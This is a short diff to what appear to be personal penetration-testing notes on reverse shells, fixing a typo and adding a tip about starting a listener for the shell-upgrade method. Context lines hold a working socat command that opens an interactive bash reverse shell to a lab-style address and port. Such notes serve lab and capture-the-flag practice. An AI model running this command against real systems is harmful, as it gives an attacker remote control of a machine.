@@ -52,8 +52,11 @@ tags:: reverse shell
 		  ```bash
 		  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.147:4444
 		  ```
-	- With `pythom` + `netcat` + some magic
+	- With `python` + `netcat` + some magic
 	  *This is the [Phineas Fisher method](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic).*
+		- #+BEGIN_IMPORTANT
+		  Do not start the listener with `rlwrap` or it won't work.
+		  #+END_IMPORTANT
 		- Within the reverse shell
 		  
 		  ```bash
